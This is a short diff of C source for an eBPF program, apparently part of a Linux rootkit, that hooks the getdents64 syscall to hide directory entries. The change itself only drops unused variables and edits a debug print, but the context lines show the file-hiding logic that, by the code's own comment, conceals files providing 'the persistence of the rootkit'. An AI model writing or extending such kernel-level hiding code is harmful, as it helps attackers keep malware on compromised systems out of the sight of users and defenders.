@@ -278,8 +278,6 @@ static __always_inline int handle_tp_sys_exit_getdents64(struct sys_getdents64_e
         return 0;
     }
 
-
-    struct linux_dirent64 *d_entry;
     __u64 *stored_data = bpf_map_lookup_elem(&fs_dir_log, &pid_tgid);
     if (stored_data == NULL){
         //Nothing for this process
@@ -302,13 +300,11 @@ static __always_inline int handle_tp_sys_exit_getdents64(struct sys_getdents64_e
         }
         struct linux_dirent64 *d_entry = (struct linux_dirent64*)(d_entry_base_addr + curr_offset);
         __u16 d_reclen;
-        __u16 d_name_len;
         char d_name[128];
         bpf_probe_read(&d_reclen, sizeof(__u16), &d_entry->d_reclen); 
         //bpf_printk("Record length: %d\n", d_reclen);
         char d_type;
         bpf_probe_read(&d_type, sizeof(d_type), &d_entry->d_type);
-        d_name_len = d_reclen - 2 - (offsetof(struct linux_dirent64, d_name));
         int err = bpf_probe_read_user(&d_name, 128, d_entry->d_name);
         if (err!=0){
             //Ignore this entry, error
@@ -337,7 +333,7 @@ static __always_inline int handle_tp_sys_exit_getdents64(struct sys_getdents64_e
         }
         
         //This hides files which achieve the persistence of the rootkit, so better not to be shown
-        bpf_printk("FILE: d_reclen: %d, d_name_len: %d, %s", d_reclen, d_name_len, d_name);
+        bpf_printk("FILE: d_reclen: %d, d_name: %s", d_reclen, d_name);
         if(previous_dir != NULL){
             if(str_n_compare(d_name, sizeof(SECRET_FILE_PERSISTENCE_NAME)-1, SECRET_FILE_PERSISTENCE_NAME, sizeof(SECRET_FILE_PERSISTENCE_NAME)-1, sizeof(SECRET_FILE_PERSISTENCE_NAME)-1)==0){
                 __u16 prev_reclen;
